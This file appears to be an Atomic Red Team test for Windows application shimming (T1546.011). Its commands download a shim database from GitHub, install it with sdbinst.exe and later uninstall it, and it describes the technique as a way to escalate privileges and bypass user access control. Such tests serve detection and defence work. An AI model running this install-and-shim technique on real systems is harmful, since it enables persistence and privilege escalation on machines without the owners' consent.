@@ -1,0 +1,18 @@
+#TechniqueName: Event Triggered Execution: Application Shimming
+#AtomicTestName: Application Shim Installation
+#Description: Install a shim database. This technique is used for privilege escalation and bypassing user access control.&Upon execution, "Installation of AtomicShim complete." will be displayed. To verify the shim behavior, run &the AtomicTest.exe from the <PathToAtomicsFolder>\\T1546.011\\bin directory. You should see a message box appear&with "Atomic Shim DLL Test!" as defined in the AtomicTest.dll. To better understand what is happening, review&the source code files is the <PathToAtomicsFolder>\\T1546.011\\src directory.&
+#Language: cmd
+
+#get_prereq_commands
+[Net.ServicePointManager]::SecurityProtocol = [Net.SecurityProtocolType]::Tls12
+New-Item -Type Directory (split-path PathToAtomicsFolder\T1546.011\bin\AtomicShimx86.sdb) -ErrorAction ignore | Out-Null
+Invoke-WebRequest "https://github.com/redcanaryco/atomic-red-team/raw/master/atomics/T1546.011/bin/AtomicShimx86.sdb" -OutFile "PathToAtomicsFolder\T1546.011\bin\AtomicShimx86.sdb"
+
+
+#commands
+sdbinst.exe PathToAtomicsFolder\T1546.011\bin\AtomicShimx86.sdb
+
+
+#cleanup_commands
+sdbinst.exe -u PathToAtomicsFolder\T1546.011\bin\AtomicShimx86.sdb >nul 2>&1
+
